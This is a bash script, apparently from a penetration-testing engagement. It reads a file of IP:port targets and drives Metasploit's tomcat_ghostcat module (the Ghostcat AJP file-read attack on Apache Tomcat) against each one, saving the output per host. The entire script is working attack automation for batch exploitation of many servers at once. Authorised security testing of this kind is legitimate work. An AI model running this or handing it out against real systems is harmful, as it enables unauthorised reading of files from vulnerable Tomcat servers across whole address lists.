#!/usr/bin/env -S bash

if [ $# -ne 2 ]; then
    echo "Usage: $0 /path/to/ajp-ip-port.txt /path/to/output_dir"
    echo ""
    echo "{ajp-ip-port.txt} name should be like {suzhou.XXX.txt}"
    echo ""
    echo "Example: $0 ~/zgz-pen/22-12-12-vrp/ajp_list/sheng-gong-si.ajp.ip-port.lst /tmp/shang-gong-si/ajp-msf-result"
    exit 0
fi

ip_port_file="$1"
output_dir="$2"

if [ ! -f "${ip_port_file}" ]; then
    echo "${ip_port_file} should be existed."
    exit 1
fi
address=$(basename "${ip_port_file}")
address=${address%%.*}

if [ ! -e "${output_dir}" ]; then
    mkdir -p "${output_dir}"
elif [ ! -d "${output_dir}" ]; then
    echo "${output_dir} should be a directory."
    exit 1
fi
output_dir=$(realpath "${output_dir}")

msf_rc=""
while read ip_port; do
    ip=$(echo "${ip_port}" | cut -d: -f1)
    port=$(echo "${ip_port}" | cut -d: -f2)
    output_file="${output_dir}/${ip}_${port}.txt"
    echo "${address}  ${ip}  ${port} ${output_file}"
    if echo "${ip}" | grep -sq -iP "^\d+\.\d+\.\d+\.\d+$" ; then
        if echo "${port}" | grep -sq -P "^[0-9]+$"; then
            msf_rc="${msf_rc}spool ${output_file};  set rhosts ${ip}; set rport ${port}; options; exploit; spool off;"
        fi
    fi
done < "${ip_port_file}"

if [ -n "${msf_rc}" ]; then
    msf_rc="use auxiliary/admin/http/tomcat_ghostcat;${msf_rc}exit"
    msfconsole -q -x "${msf_rc}"
fi
